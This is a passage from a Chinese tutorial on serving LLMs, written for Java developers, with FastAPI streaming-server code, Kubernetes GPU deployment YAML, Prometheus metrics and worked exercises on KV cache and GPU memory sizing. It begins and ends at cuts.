- **把 `HF_HOME` 挂到共享持久卷** —— 否则每个 Pod 启动都要重下 15 GB
- **镜像里不要打包权重** —— 镜像会变成几十 GB，拉取就是冷启动灾难
- **用 commit sha 而不是分支名固定版本** —— 等价于你锁 Maven 版本号。`main` 分支上的模型是会被作者悄悄改的

---

## 5. 推理服务：最贴近你 Java 经验的一节 ★★

### FastAPI ≈ Spring Boot + Bean Validation

| Spring | FastAPI | 差别 |
|---|---|---|
| `@RestController` / `@PostMapping` | `@app.post` | |
| DTO + `@Valid` | pydantic `BaseModel` | **运行时强校验**，v2 内核是 Rust |
| Tomcat / Netty | `uvicorn`（ASGI） | |
| Springdoc / Swagger | **自动生成**，访问 `/docs` | 不用配置 |
| `@ControllerAdvice` | 异常处理器 / 中间件 | |
| Spring DI | `Depends()` | |
| `@PostConstruct` / `@PreDestroy` | `lifespan` 上下文管理器 | |
| `CompletableFuture` | `async def` + `await` | **单线程事件循环** |

### 一个不需要 GPU 的最小推理服务

关键设计：后端是**假的**，但按真实 LLM 的两段式节奏吐 token。这样服务化的全部机制 —— 校验、SSE、背压、取消、埋点 —— 你在笔记本上就能练完，换成真 vLLM 只是改一个类。

```python
"""阶段四 4.4 —— 最小可跑的 OpenAI 兼容推理服务（不需要 GPU）。

跑起来：
    uv run uvicorn d_serve_min:app --port 8000
    curl -N localhost:8000/v1/chat/completions -H 'content-type: application/json' \
         -d '{"model":"fake","messages":[{"role":"user","content":"hi"}],"stream":true}'
"""
from __future__ import annotations

import asyncio
import json
import time
import uuid
from collections.abc import AsyncIterator

from fastapi import FastAPI
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field

# ── 1. 契约层：pydantic ≈ DTO + @Valid，但校验是**运行时真做**的 ──────


class Message(BaseModel):
    role: str = Field(pattern="^(system|user|assistant)$")
    content: str = Field(min_length=1, max_length=32_000)


class ChatRequest(BaseModel):
    model: str
    messages: list[Message] = Field(min_length=1)
    max_tokens: int = Field(default=128, ge=1, le=4096)
    temperature: float = Field(default=0.7, ge=0.0, le=2.0)
    stream: bool = False


# ── 2. 后端：模拟真实 LLM 的两段式节奏 ─────────────────────────────

TTFT_S = 0.25          # 首 token 时延：prefill 阶段，算力瓶颈
ITL_S = 0.012          # token 间隔：decode 阶段，访存瓶颈


async def fake_generate(req: ChatRequest) -> AsyncIterator[str]:
    """模拟一次生成。注意这里的两段式节奏，它复刻了真实 LLM 的行为。"""
    await asyncio.sleep(TTFT_S)                       # prefill
    vocab = ["这", "是", "一", "个", "假", "的", "回", "答", "，", "用", "来", "练", "服", "务", "化", "。"]
    n = min(req.max_tokens, 64)
    for i in range(n):
        await asyncio.sleep(ITL_S)                    # decode，一次一个 token
        yield vocab[i % len(vocab)]


# ── 3. 路由 ────────────────────────────────────────────────────────

app = FastAPI(title="mini-gateway")


def _chunk(cid: str, model: str, delta: dict, finish: str | None = None) -> str:
    """一条 SSE 数据行。OpenAI 的流式格式就长这样。"""
    payload = {
        "id": cid, "object": "chat.completion.chunk",
        "created": int(time.time()), "model": model,
        "choices": [{"index": 0, "delta": delta, "finish_reason": finish}],
    }
    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n"


@app.post("/v1/chat/completions")                     # ≈ @PostMapping
async def chat(req: ChatRequest):
    cid = f"chatcmpl-{uuid.uuid4().hex[:12]}"
    if not req.stream:
        text = "".join([t async for t in fake_generate(req)])
        return {
            "id": cid, "object": "chat.completion", "model": req.model,
            "choices": [{"index": 0, "message": {"role": "assistant", "content": text},
                         "finish_reason": "stop"}],
            "usage": {"completion_tokens": len(text)},
        }

    async def sse() -> AsyncIterator[str]:
        yield _chunk(cid, req.model, {"role": "assistant", "content": ""})
        try:
            async for tok in fake_generate(req):
                yield _chunk(cid, req.model, {"content": tok})
            yield _chunk(cid, req.model, {}, finish="stop")
            yield "data: [DONE]\n\n"
        except asyncio.CancelledError:
            # ★ 客户端断开时会走到这里。真后端在这里必须**取消下游生成**，
            #   否则 GPU 还在为一个没人看的请求算 token —— 白烧钱。
            print(f"[{cid}] 客户端断开，已取消生成")
            raise

    return StreamingResponse(
        sse(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.get("/healthz")     # liveness：进程还活着吗
async def healthz():
    return {"status": "ok"}


@app.get("/readyz")      # readiness：★ 和 liveness 不是一回事
async def readyz():
    # 真实服务里这里要检查"权重加载完了没"。模型要几分钟才加载完，
    # 这期间进程是活的但**不能**接流量 —— 混淆这两者会导致滚动更新时 502。
    return {"status": "ready", "model_loaded": True}
```

验证（用 `TestClient`，不用真起服务器）：

```python
from fastapi.testclient import TestClient
from d_serve_min import app

c = TestClient(app)
body = {"model": "fake", "messages": [{"role": "user", "content": "你好"}], "max_tokens": 8}

r = c.post("/v1/chat/completions", json=body)
print("非流式:", r.status_code, r.json()["choices"][0]["message"]["content"])

with c.stream("POST", "/v1/chat/completions", json={**body, "stream": True}) as s:
    lines = [ln for ln in s.iter_lines() if ln.startswith("data:")]
print("流式:  ", len(lines), "个 SSE 事件，最后一个 =", lines[-1])

bad = c.post("/v1/chat/completions", json={"model": "f", "messages": [], "max_tokens": 99999})
print("校验:  ", bad.status_code, [(e["loc"], e["type"]) for e in bad.json()["detail"]])
print("健康:  ", c.get("/healthz").json(), c.get("/readyz").json())
```

:::out 实际输出
```text
非流式: 200 这是一个假的回答
流式:   11 个 SSE 事件，最后一个 = data: [DONE]
校验:   422 [(['body', 'messages'], 'too_short'), (['body', 'max_tokens'], 'less_than_equal')]
健康:   {'status': 'ok'} {'status': 'ready', 'model_loaded': True}
```
:::

:::note pydantic 一次返回了**两个**校验错误
Spring 的 `@Valid` 也是这个行为，但很多人第一次用 FastAPI 会惊讶：坏请求返回的是 **422**（不是 400），而且 `detail` 是一个**数组** —— 每个字段的问题各占一条，带 `loc` 路径。

这对客户端很友好（能直接把错误标到表单字段上），但如果你在对齐 OpenAI 的 API 契约，记得**它用的是 400 + 单个 error 对象**。要么写个异常处理器转换，要么在文档里说清楚。阶段五的网关采用了 OpenAI 的格式。
:::

### 为什么不能拿 transformers 裸跑服务

| 做法 | GPU 利用率 | 问题 |
|---|---|---|
| `transformers` + `model.generate()` 单请求 | 个位数 % | 一次只服务一个人，GPU 绝大部分时间在等 |
| 手写静态批处理 | 20~40% | 必须等最慢的请求结束，整批才能返回 |
| **vLLM / SGLang** | 70~90% | continuous batching + PagedAttention |

两个核心机制：

- **PagedAttention** —— 把 KV cache 当虚拟内存分页管理。传统做法要为每个请求预留"最大长度"的连续显存，碎片率能到 60-80%；分页后按需分配 4KB 级的块，碎片率降到个位数。**这直接等于并发数翻几倍。**
- **Continuous batching** —— 请求级动态组批。一个请求生成完就立刻离开批次，新请求马上补进来，不用等整批结束。**这解决的是"一个长请求拖死一整批"的问题。**

### 必须内化的指标口径

| 指标 | 定义 | 归因 |
|---|---|---|
| **TTFT** | 首 token 时延 | 排队 + prefill。用户感知的"反应快不快" |
| **TPOT / ITL** | 每个后续 token 的间隔 | decode 速度。决定"打字机"流畅度 |
| 端到端时延 | TTFT + TPOT × 输出长度 | 和输出长度强相关，单看它会误导 |
| 吞吐 | tokens/s（全系统） | 容量规划的核心 |
| 排队时延 | 请求在调度器里等了多久 | **区分"GPU 慢"和"排不上队"** |
| KV cache 使用率 | 已用块 / 总块 | OOM 的先行指标 |

:::warn 一句话解释几乎所有 LLM 服务的性能现象
**prefill 阶段是算力瓶颈，decode 阶段是访存瓶颈。**

- **prefill**：一次性处理整个 prompt，是个大矩阵乘，能把张量核心喂饱 → **算力受限**
- **decode**：一次只生成一个 token，每步都要把**全部权重**从显存读一遍，算的却只有一点点 → **带宽受限**

推论（这些都是面试题）：
1. **增大 batch 对 decode 收益巨大**（权重只读一次，摊给 N 个请求），对 prefill 收益有限
2. **decode 阶段增大 batch 几乎不增加单步耗时** —— 这就是 continuous batching 的物理基础
3. **长 prompt 拖慢的是 TTFT，长输出拖慢的是端到端时延** —— 两者要分开优化
4. **int4 量化对 decode 有帮助**（少读一半权重），对 prefill 帮助小 —— 因为算力没变
:::

---

## 6. 分布式与编排

### Ray：分布式的 Executor + Actor

```python
"""Ray 的心智模型：@ray.remote 把函数变任务、把类变 actor。"""
import ray

ray.init()

@ray.remote(num_gpus=1)                     # ≈ 声明这个任务要一张卡
def embed_shard(texts: list[str]) -> list[list[float]]:
    import torch
    model = load_model().cuda()
    return model.encode(texts)

# 提交 4 个任务，Ray 负责调度到有空闲 GPU 的节点
futures = [embed_shard.remote(shard) for shard in shards]
results = ray.get(futures)                  # ≈ CompletableFuture.allOf().join()


@ray.remote(num_gpus=1)
class ModelActor:
    """Actor = 有状态的远程对象。模型只加载一次，之后复用。"""
    def __init__(self, path: str):
        self.model = load_model(path).cuda()   # ← 加载一次

    def generate(self, prompt: str) -> str:
        return self.model.generate(prompt)

actor = ModelActor.remote("/models/qwen3-8b")
print(ray.get(actor.generate.remote("hello")))
```

:::note Ray 的 task 和 actor 的区别，就是 Java 里「无状态 Bean」和「有状态 Bean」
- **task（`@ray.remote` 函数）** —— 无状态，每次调用重新开始。适合数据处理、批量推理
- **actor（`@ray.remote` 类）** —— 有状态，模型加载一次后常驻。**LLM 服务必须用 actor**，否则每个请求都要重新加载 15 GB 权重

`ray.get()` 是阻塞的，等价于 `future.join()`。在 async 代码里要用 `await actor.generate.remote(...)`。
:::

### 多卡训练的名词表（infra 侧要能定位问题，不必自己写训练循环）

| 名词 | 是什么 | infra 侧要关心 |
|---|---|---|
| **DDP** | 数据并行：每卡一份完整模型，梯度 all-reduce | 通信量 = 模型大小 × 2 |
| **FSDP / ZeRO** | 参数也切片，显存换通信 | 显存降下来了，网络成了瓶颈 |
| **张量并行 (TP)** | 单层切到多卡，每步都要通信 | **必须在同一台机的 NVLink 内** |
| **流水并行 (PP)** | 按层切到多卡 | 有气泡，需要调 micro-batch |
| `torchrun` | 启动器，设 `RANK`/`WORLD_SIZE` 等环境变量 | ≈ MPI 的 mpirun |
| **NCCL** | GPU 间集合通信库 | **"卡在 all-reduce" 90% 是它的问题** |

:::warn 「卡在 all-reduce」的排查清单
这是训练平台最常见的故障，而且现象很唬人：所有卡 100% 利用率，但 step 数不涨。

按顺序查：
1. **有 rank 挂了** —— 集合通信要求所有 rank 都到齐，一个挂了其余全等。查每个 rank 的日志，不要只看 rank 0
2. **`/dev/shm` 太小** —— 容器默认 64 MB，NCCL 需要几个 GB。K8s 里挂 `emptyDir: {medium: Memory}`
3. **网络没走对** —— `NCCL_DEBUG=INFO` 看它选了哪条路。走了 TCP 而不是 IB/NVLink 会慢几十倍
4. **数据加载不均** —— 某个 rank 的 dataloader 慢，其余在 all-reduce 处等它。这不是 NCCL 的错
5. **超时设置** —— `torch.distributed.init_process_group(timeout=...)` 默认 30 分钟，出问题时会挂很久才报错，调小它

**第一条命令永远是**：`py-spy dump --pid <每个 rank 的 pid>`，看它们分别卡在哪一行。
:::

### K8s + GPU：四个坑

```yaml
# 一份能直接用的部署骨架。四个 GPU 服务特有的坑都标出来了。
apiVersion: apps/v1
kind: Deployment
metadata:
  name: llmgw
spec:
  replicas: 2
  selector: {matchLabels: {app: llmgw}}
  template:
    metadata: {labels: {app: llmgw}}
    spec:
      containers:
        - name: gateway
          image: your-registry/llmgw:1.0.0
          ports: [{containerPort: 8000}]
          env:
            - {name: LLMGW_BACKEND,   value: "vllm"}
            - {name: VLLM_URL,        value: "http://vllm:8001"}
            - {name: MAX_CONCURRENCY, value: "8"}   # ← 用上面的显存公式算出来的
            - {name: MAX_QUEUE,       value: "32"}
          resources:
            requests: {nvidia.com/gpu: 1, memory: 8Gi}   # 坑1：GPU 只能整数申请
            limits:   {nvidia.com/gpu: 1, memory: 16Gi}
          livenessProbe:                                  # 坑2：liveness 只查进程
            httpGet: {path: /healthz, port: 8000}
            initialDelaySeconds: 10
            periodSeconds: 10
          readinessProbe:                                 # 坑3：readiness 才查模型
            httpGet: {path: /readyz, port: 8000}
            initialDelaySeconds: 15
            periodSeconds: 5
            failureThreshold: 60      # 权重加载慢，给足 5 分钟，别让它被判死刑
          volumeMounts:
            - {name: models, mountPath: /models}
            - {name: dshm,   mountPath: /dev/shm}         # 坑4：默认 64MB，NCCL 会挂
      volumes:
        - name: models
          persistentVolumeClaim: {claimName: model-cache} # 权重放共享卷，不进镜像
        - name: dshm
          emptyDir: {medium: Memory, sizeLimit: 8Gi}
```

| 坑 | 现象 | 修法 |
|---|---|---|
| 1. GPU 不可分割 | `nvidia.com/gpu: 0.5` 被拒绝 | 要共享得用 MIG 或时分复用（MPS） |
| 2. liveness 查了模型 | 加载期间探测失败 → **无限重启** | liveness 只查进程，用 `/healthz` |
| 3. readiness 太严 | 滚动更新时 502 | `failureThreshold` 给足加载时间 |
| 4. `/dev/shm` 只有 64 MB | NCCL / DataLoader 莫名挂死 | 挂 `emptyDir: {medium: Memory}` |
| 5. 镜像几十 GB | 冷启动十几分钟 | 权重放 PVC，镜像里只放代码 |

---

## 7. 可观测性：AI 服务该埋什么

普通 Web 服务埋 QPS / 时延 / 错误率就够了。LLM 服务**必须**额外埋四个：

```python
"""Prometheus 指标。普通 Web 服务的那套不够用。"""
from prometheus_client import CollectorRegistry, Counter, Gauge, Histogram

REGISTRY = CollectorRegistry()

# ★ 分桶按"你要回答的问题"设计，不要用默认桶：
#   TTFT 的关注区间是 50ms~5s，端到端是 0.5s~2min，它们的桶必须不同。
TTFT = Histogram("llmgw_ttft_seconds", "首 token 时延", ["model"],
                 buckets=(.05, .1, .2, .3, .5, .75, 1, 1.5, 2, 3, 5, 10),
                 registry=REGISTRY)
E2E = Histogram("llmgw_request_seconds", "端到端时延", ["model", "outcome"],
                buckets=(.1, .25, .5, 1, 2, 4, 8, 15, 30, 60, 120),
                registry=REGISTRY)
QUEUE_WAIT = Histogram("llmgw_queue_seconds", "排队时延", ["model"],
                       buckets=(.001, .01, .05, .1, .25, .5, 1, 2, 5, 10),
                       registry=REGISTRY)
ITL = Histogram("llmgw_inter_token_seconds", "token 间隔 (TPOT)", ["model"],
                buckets=(.002, .005, .01, .02, .05, .1, .25, .5),
                registry=REGISTRY)

REQUESTS = Counter("llmgw_requests_total", "请求数", ["model", "outcome"], registry=REGISTRY)
TOKENS = Counter("llmgw_tokens_total", "token 数", ["model", "kind"], registry=REGISTRY)

IN_FLIGHT = Gauge("llmgw_in_flight", "正在生成的请求数", registry=REGISTRY)
WAITING = Gauge("llmgw_waiting", "排队中的请求数", registry=REGISTRY)
READY = Gauge("llmgw_backend_ready", "后端就绪 (1/0)", registry=REGISTRY)
```

| 指标 | 为什么普通 Web 服务不需要 |
|---|---|
| **TTFT** | 普通请求"要么快要么慢"；流式请求的用户感知只取决于**第一个字节**什么时候到 |
| **排队时延** | 区分"GPU 算得慢"和"根本排不上队"。**定容量时全靠它** |
| **in-flight** | 每个在途请求都占着 KV cache 显存 —— 这是 **OOM 的先行指标** |
| **token 计数** | 成本核算的量纲。"每千 token 成本"是 AI 服务唯一有意义的单位成本 |

:::note 分桶设计是 Histogram 唯一需要动脑的地方
Prometheus 的默认桶是 `.005, .01, .025, ..., 10` —— 为"毫秒级 Web 请求"设计的。

拿它量 LLM：端到端时延普遍 5-60 秒，**全部落进 `+Inf` 桶**，于是你的 P95 查询返回 `+Inf`，监控图是一条直线。

三条规则：
1. **按你要回答的问题设桶** —— "TTFT 有没有超过 500ms" 就要在 0.5 附近密集布点
2. **不同指标不同桶** —— TTFT（50ms~10s）和端到端（100ms~2min）的量级差 10 倍以上
3. **桶数不要超过 ~15 个** —— 每个桶 × 每个 label 组合 = 一条时间序列，容易把 Prometheus 撑爆
:::

:::out 真实的 `/metrics` 输出（跑完一轮压测后）
```text
llmgw_ttft_seconds_bucket{le="0.1",model="fake-1b"} 270.0
llmgw_ttft_seconds_bucket{le="0.2",model="fake-1b"} 344.0
llmgw_ttft_seconds_bucket{le="0.5",model="fake-1b"} 344.0
llmgw_request_seconds_count{model="fake-1b",outcome="cancelled"} 1.0
llmgw_request_seconds_count{model="fake-1b",outcome="done"} 343.0
llmgw_queue_seconds_sum{model="fake-1b"} 155.16124890878564
llmgw_requests_total{model="fake-1b",outcome="cancelled"} 1.0
llmgw_requests_total{model="fake-1b",outcome="done"} 343.0
llmgw_tokens_total{kind="completion",model="fake-1b"} 16158.0
llmgw_tokens_total{kind="prompt",model="fake-1b"} 4118.0
llmgw_in_flight 0.0
llmgw_backend_ready 1.0
```

注意 `outcome="cancelled" 1.0` —— 那是我用 `curl ... | head -4` 提前断开的那一次，网关**检测到了并停止了生成**。这条指标就是"我们没有为没人看的请求烧 GPU"的证据。

还有 `queue_seconds_sum=155s / 344 次 ≈ 0.45s` 平均排队 —— 压测的高并发档位把队列排起来了，这正是下一页要分析的东西。
:::

---

## 8. 练习

:::exercise 练习 1 · 广播找茬（20 分钟）
下面四段代码，哪些会报错、哪些会**静默出错**、哪些是对的？先不要跑，先推理。

```python
import numpy as np
logits = np.random.randn(8, 1000)        # (batch=8, vocab=1000)

a = logits + np.random.randn(1000)       # ?
b = logits + np.random.randn(8)          # ?
c = logits * np.random.randn(8, 1)       # ?
d = logits - logits.max(axis=-1)         # ?
```
:::

:::solution
```text
a: (8, 1000)  ✅ 对 —— 每行加同一个 vocab 偏置，这是标准的 logit bias
b: ValueError ✅ 报错是好事 —— (8,) 右对齐成 (1,8)，和 1000 对不上
c: (8, 1000)  ✅ 对 —— 每行乘各自的缩放系数（temperature per sample）
d: ValueError ❌ 这是真正的坑
```

`d` 的问题：`logits.max(axis=-1)` 的 shape 是 `(8,)`，不是 `(8,1)`。右对齐后变成 `(1,8)` vs `(8,1000)` → 报错。

**正确写法**：

```python
d = logits - logits.max(axis=-1, keepdims=True)    # (8,1) → 广播正确
```

`keepdims=True` 是写 softmax、layernorm、归一化时**必须**加的，它保留被归约的那一维为 1，让结果还能广播回去。

:::warn 把 vocab 换成 8，`d` 就变成静默的 bug
```python
logits = np.random.randn(8, 8)              # batch 和 vocab 碰巧都是 8
d = logits - logits.max(axis=-1)            # 不报错了！但完全错了
```

`(8,)` 广播成 `(1,8)`，于是"每行减自己的最大值"变成了"**每列**减第 j 行的最大值"。softmax 结果全错，但不会报任何错。

这就是为什么 **debug 张量代码时要用互质的维度**：`batch=3, seq=5, hidden=7`。如果所有维度都是 8 或 16，广播错误会全部静默通过。这是个非常实用的技巧。
:::
:::

:::exercise 练习 2 · 显存口算（30 分钟）
不查工具，口算下面四题（然后用口算器验证）：

1. Qwen3-32B，bf16，权重多少 GiB？一张 A100-80G 装得下吗？
2. 该模型 64 层、8 个 KV 头、head_dim 128，KV cache 每 token 多少 KiB？
3. 8k 上下文、A100-80G，最多能并发多少个满长度请求？
4. 如果把权重量化到 fp8，并发能涨多少？为什么涨得不多？
:::

:::solution
**1. 权重**
```
32.8e9 × 2 字节 = 65.6 GB = 65.6e9 / 2^30 = 61.1 GiB
```
A100-80G 理论装得下，但只剩 80×0.9 − 61.1 = **10.9 GiB** 给 KV cache —— 非常紧张。

**2. KV cache 每 token**
```
2 (K和V) × 64 层 × 8 个KV头 × 128 head_dim × 2 字节 = 262,144 B = 256 KiB/token
```
正好是 Llama-3.1-8B（128 KiB）的两倍 —— 因为层数翻倍了。

**3. 8k 上下文的并发**
```
每请求 KV = 256 KiB × 8192 = 2 GiB
可用 = 80 × 0.9 − 61.1 = 10.9 GiB
并发 = 10.9 / 2 = 5 个
```

**4. fp8 量化后**
```
权重 = 32.8e9 × 1 / 2^30 = 30.5 GiB（省了 30.6 GiB）
可用 = 72 − 30.5 = 41.5 GiB
并发 = 41.5 / 2 = 20 个
```

这题**涨了 4 倍**（5 → 20），和表 1 的"只涨 19%"不一样 —— 为什么？

**因为权重占比不同。** 32B 模型的权重（61 GiB）吃掉了 80 GiB 卡的 76%，KV 只剩零头；量化释放的 30 GiB 相对那点零头是巨大的。而 8B 模型的权重只占 19%，量化释放的空间相对 57 GiB 的 KV 空间微不足道。

**可迁移的判断规则**：

| 权重占卡的比例 | 量化的收益 | 该做什么 |
|---|---|---|
| > 60%（大模型挤小卡） | **很大** | 优先量化 |
| < 30%（小模型大卡） | 很小 | 优先调 `max_model_len`、用 GQA、量化 KV |

**别背结论，背这个判断方法** —— 先算权重占比，再决定拧哪个旋钮。
:::

:::exercise 练习 3 · 手写 KV cache（45 分钟）
用 NumPy 实现一个带 KV cache 的单层自回归解码，验证：

1. 有 cache 和无 cache（每次重算全部）的输出**逐元素相同**
2. 生成第 N 个 token 时，有 cache 的计算量是 O(N)，无 cache 是 O(N²)
3. 打印出 cache 的显存占用随 N 的增长

这是理解 PagedAttention 的前提 —— 你得先知道 cache 里存的到底是什么。
:::

:::solution
```python
"""用 NumPy 手写 KV cache，验证它和"每次重算"逐元素等价。"""
from __future__ import annotations

import numpy as np

rng = np.random.default_rng(0)
D, H = 64, 4                      # hidden, heads
HD = D // H                       # head_dim
SCALE = np.float32(1.0 / np.sqrt(HD))       # ★ 先转 float32，否则整条链被提升成 float64
Wq, Wk, Wv = (rng.standard_normal((D, D)).astype(np.float32) * 0.1 for _ in range(3))


def softmax(z, axis=-1):
    z = z - z.max(axis=axis, keepdims=True)
    e = np.exp(z)
    return e / e.sum(axis=axis, keepdims=True)


def split_heads(x):               # (seq, D) -> (H, seq, HD)
    return x.reshape(-1, H, HD).transpose(1, 0, 2)


def attend(q, k, v):              # q:(H,1,HD)  k,v:(H,seq,HD)
    scores = (q @ k.transpose(0, 2, 1)) * SCALE          # (H,1,seq)
    return (softmax(scores) @ v).transpose(1, 0, 2).reshape(1, D).astype(np.float32)


# ── 方式 A：无 cache，每步把整个前缀重新投影一遍 ──────────────────
def decode_no_cache(x0: np.ndarray, steps: int) -> tuple[np.ndarray, int]:
    seq = x0.copy()
    projected = 0                                    # 累计投影过多少个 token
    for _ in range(steps):
        k = split_heads(seq @ Wk)                    # ← 整个前缀重算
        v = split_heads(seq @ Wv)
        projected += len(seq)
        q = split_heads(seq[-1:] @ Wq)
        seq = np.concatenate([seq, attend(q, k, v)], axis=0)
    return seq, projected


# ── 方式 B：有 cache，每步只投影 1 个新 token ─────────────────────
def decode_with_cache(x0: np.ndarray, steps: int) -> tuple[np.ndarray, int, int]:
    k_cache = split_heads(x0 @ Wk)                   # (H, seq, HD)，prompt 先填进去
    v_cache = split_heads(x0 @ Wv)
    seq = x0.copy()
    projected = len(x0)
    for _ in range(steps):
        q = split_heads(seq[-1:] @ Wq)
        out = attend(q, k_cache, v_cache)            # 只读 cache，不重算
        seq = np.concatenate([seq, out], axis=0)
        # ★ 生成出新 token 之后，才把它的 K/V 追加进 cache，供下一步使用
        k_cache = np.concatenate([k_cache, split_heads(out @ Wk)], axis=1)
        v_cache = np.concatenate([v_cache, split_heads(out @ Wv)], axis=1)
        projected += 1
    return seq, projected, k_cache.nbytes + v_cache.nbytes


if __name__ == "__main__":
    x0 = rng.standard_normal((4, D)).astype(np.float32)   # 4 个 prompt token

    print("① 等价性：有无 cache 的输出必须逐元素相同")
    for steps in (1, 5, 20, 100):
        a, _ = decode_no_cache(x0, steps)
        b, _, _ = decode_with_cache(x0, steps)
        print(f"   steps={steps:<4} 形状 {str(a.shape):<10} 最大误差 {np.abs(a-b).max():.2e}"
              f"  逐元素相同={np.allclose(a, b, atol=1e-5)}")

    print("\n② 计算量：以「投影过的 token 数」衡量。无 cache 是 O(N²)，有 cache 是 O(N)")
    print(f"   {'steps':>6}{'无cache':>12}{'有cache':>10}{'省了':>9}")
    for steps in (10, 50, 200, 800):
        _, p_no = decode_no_cache(x0, steps)
        _, p_kv, _ = decode_with_cache(x0, steps)
        print(f"   {steps:>6}{p_no:>12,}{p_kv:>10,}{p_no/p_kv:>8.1f}×")

    print("\n③ 代价：cache 显存随 N 线性增长")
    print(f"   {'steps':>6}{'cache 字节':>13}{'每 token':>11}")
    for steps in (10, 100, 1000):
        _, _, nbytes = decode_with_cache(x0, steps)
        print(f"   {steps:>6}{nbytes:>13,}{nbytes/(4+steps):>10.0f}B")
    print(f"\n   公式验证：2(K和V) × {H}头 × {HD}dim × 4字节(fp32) = {2*H*HD*4} B/token ✓")
```

跑出来：

```text
① 等价性：有无 cache 的输出必须逐元素相同
   steps=1    形状 (5, 64)    最大误差 0.00e+00  逐元素相同=True
   steps=5    形状 (9, 64)    最大误差 1.79e-07  逐元素相同=True
   steps=20   形状 (24, 64)   最大误差 1.79e-07  逐元素相同=True
   steps=100  形状 (104, 64)  最大误差 1.79e-07  逐元素相同=True

② 计算量：以「投影过的 token 数」衡量。无 cache 是 O(N²)，有 cache 是 O(N)
    steps      无cache    有cache       省了
       10          85        14     6.1×
       50       1,425        54    26.4×
      200      20,700       204   101.5×
      800     322,800       804   401.5×

③ 代价：cache 显存随 N 线性增长
    steps     cache 字节    每 token
       10        7,168       512B
      100       53,248       512B
     1000      514,048       512B

   公式验证：2(K和V) × 4头 × 16dim × 4字节(fp32) = 512 B/token ✓
```

**三个结论**：

1. **KV cache 是纯粹的"用显存换算力"** —— 输出逐元素相同（误差 1.79e-07 是 float32 的舍入，不是算法差异），但 800 步时少投影了 400 倍的 token。这就是为什么**没有任何生产推理不用 KV cache**。
2. **省下的倍数随 N 线性增长** —— 输出越长，cache 越划算。反过来说，超短输出（比如分类任务只出 1 个 token）几乎用不上它。
3. **代价是每 token 固定的显存**，而且**公式和实测严丝合缝**：512 B/token。真实 Llama-3.1-8B 是 128 KiB/token，**250 倍**。§3 的显存口算器算的就是这个。

:::warn 写这段代码时我踩了两个坑，都值得你也踩一遍
**坑 1：cache 的追加时机。** 我最初在循环开头就把 `seq[-1:]` 的 K/V 追加进 cache —— 但第一次循环时，`seq[-1]` 还是 prompt 的最后一个 token，**它的 K/V 已经在 cache 里了**。于是 cache 里多了一份重复，等价性检查直接 `False`。

正确顺序是：**先用当前 cache 算出新 token，再把新 token 的 K/V 追加进去**。这个"追加时机"正是真实推理引擎里最容易写错的地方之一。

**坑 2：dtype 被悄悄提升成 float64。** `1.0 / np.sqrt(HD)` 返回的是 **Python float / np.float64**，和 float32 张量相乘会把整条链提升成 float64 —— cache 的每 token 字节数从 512 变成 1024，**显存直接翻倍**，而且没有任何报错。

修法是 `SCALE = np.float32(1.0 / np.sqrt(HD))`。**在真实推理服务里，这个 bug 意味着你的并发数莫名其妙只有预期的一半。** 养成习惯：关键路径上打一次 `print(tensor.dtype)`。
:::

**接下来的问题**：cache 要随请求增长，但显存要预先分配。传统做法是"按 max_len 预留连续显存"，碎片率 60-80%。**PagedAttention 就是把这块显存改成分页管理** —— 4KB 的块按需分配，逻辑上连续、物理上分散。和操作系统的虚拟内存一模一样。

理解了这个玩具实现，你就知道 vLLM 在管理什么了。
:::

:::exercise 练习 4 · 给最小服务加三个生产能力（1.5 小时）
在 §5 的 `d_serve_min.py` 基础上加：

1. **并发上限**：超过 N 个在途请求就返回 429（带 `Retry-After`）
2. **取消检测**：客户端断开时停止生成，并打印实际生成了几个 token
3. **TTFT 指标**：暴露 `/metrics`，TTFT 单独成一个 Histogram

验收：用 `curl -N ... | head -3` 提前断开，服务端应该打印"已取消，生成了 3 个 token"。
:::

:::solution
这三件事就是阶段五那个网关的核心，所以这里只点出**三个最容易写错的地方**，完整实现见下一页。

**① 429 必须在第一个字节之前返回**

```python
# ❌ 错的：在 StreamingResponse 里判断
async def body():
    if too_many:
        yield 'data: {"error": "overloaded"}\n\n'   # HTTP 状态码已经是 200 了！
```

一旦 `StreamingResponse` 开始输出，HTTP 头**已经发出去了**，状态码改不了。客户端 SDK 看到 200 就认为成功，只会在解析流时困惑。

```python
# ✅ 对的：准入判断放在 return StreamingResponse 之前
slot = ctl.slot()
try:
    await slot.__aenter__()
except Overloaded:
    return JSONResponse(status_code=429, ..., headers={"Retry-After": "2"})
return StreamingResponse(body())    # 到这里才开始流
```

**② 名额必须在 `finally` 里释放**

```python
async def body():
    try:
        async for tok in backend.stream(req):
            yield frame(tok)
    finally:
        await slot.__aexit__(None, None, None)   # ★ 客户端断开走的是
                                                 #   CancelledError 路径
```

漏掉这个 `finally`，每次客户端断开就泄漏一个并发名额。服务跑几小时后，**所有请求都返回 429**，重启才能恢复 —— 而且你在日志里找不到任何异常。这是最难查的一类 bug。

**③ 检测断开要在每个 token 之后**

```python
async for tok in backend.stream(req):
    yield frame(tok)
    if await request.is_disconnected():    # ← 每个 token 查一次
        break
```

`is_disconnected()` 很便宜（查一个标志位），但**只在 yield 之后才有意义** —— ASGI 服务器要真正尝试写一次才知道对端没了。

验收时你会看到：

```text
{"ts": "...", "level": "INFO", "msg": "stream finished",
 "request_id": "a3f...", "outcome": "cancelled", "tokens": 3, "ttft_ms": 251.4}
```

`outcome: cancelled` + `tokens: 3` —— 这两个字段就是"我们没有为没人看的请求烧 GPU"的证据。
:::

:::exercise 练习 5 · 指标设计（30 分钟）
你的推理服务被投诉"有时候特别慢"。现有指标只有端到端时延的 P50/P95。

设计一组指标，能区分下面**五种**不同的"慢"，并说明每种对应什么修复动作。
:::

:::solution
端到端时延把所有原因混在一起了。要拆成**归因链**：

```text
端到端时延 = 排队时延 + TTFT(prefill) + 输出长度 × TPOT
```

| 现象 | 关键指标组合 | 根因 | 修复动作 |
|---|---|---|---|
| 1. 排队久 | `queue_seconds` P95 高，`in_flight` 打满 | **容量不够** | 加副本 / 提高 `max_concurrency`（先用显存公式确认装得下） |
| 2. prefill 慢 | `ttft` 高但 `queue` 低，输入 token 数大 | **prompt 太长** | prompt 压缩、prefix caching、prefill/decode 分离部署 |
| 3. decode 慢 | `inter_token_seconds` 高 | **访存瓶颈 / 批太大** | 权重量化、降低批大小、换带宽更高的卡 |
